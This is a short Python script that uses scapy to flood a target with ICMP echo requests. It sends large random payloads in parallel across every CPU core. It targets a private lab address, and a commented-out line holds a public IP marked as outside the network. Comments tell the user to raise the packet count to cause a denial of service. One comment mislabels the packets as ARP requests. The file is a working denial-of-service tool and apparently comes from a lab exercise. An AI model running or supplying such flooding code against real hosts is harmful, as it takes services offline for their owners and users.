# ICMP FLOODING
# used microprocessing to speed up the process
# change 1000 to 1000000000000000000. CONSEQUENCE: DOS:also, my system crashed
from scapy.all import *
import random
import multiprocessing
import sys
import signal

source_ip = "192.168.163.128"
source_mac = "00:0c:29:a7:96:49"
destination_ip = "192.168.163.2"
destination_mac = "00:50:56:e7:1a:49"
# destination_ip = "142.251.214.142" #outside network
# destination_mac = "ff:ff:ff:ff:ff:ff"
# c = 10000000000000000 # number of echo-request to send

def echo_request(source_ip,source_mac,destination_ip,destination_mac):
	pkt = Ether()/IP()/ICMP()/Raw(RandString(size=1450))
	# icmp's type is by default set to echo-request
	# randomly generate icmp's id and sequence as their default value of 0 might be blocked by all firewalls.
	pkt["Ethernet"].src = source_mac
	pkt["Ethernet"].dst = destination_mac
	pkt["IP"].src = source_ip
	pkt["IP"].dst = destination_ip
	pkt["ICMP"].id = random.randint(1, 100)
	pkt["ICMP"].seq = random.randint(1, 100)
	sendp(pkt)

def signal_handler(signal, frame):
	print("Interrupt received.")
	sys.exit(0)
# signal.signal(signal.SIGINT, signal_handler)


# Utilize all available processors for parallel execution
num_cpus = multiprocessing.cpu_count()
pool_obj = multiprocessing.Pool(num_cpus)

# Submit 1000 individual ARP requests to the pool
for _ in range(1000):
	pool_obj.apply_async(echo_request,(source_ip,source_mac,destination_ip,destination_mac))
# Close the pool and wait for all tasks to finish
pool_obj.close()
pool_obj.join()


# results = pool_obj.starmap(echo_request,[(source_ip,source_mac,destination_ip,destination_mac,v) for v in range(1,10000)])
# pool_obj.close()
# echo_request(source_ip=source_ip,source_mac=source_mac,destination_ip=destination_ip,destination_mac=destination_mac,c=c)
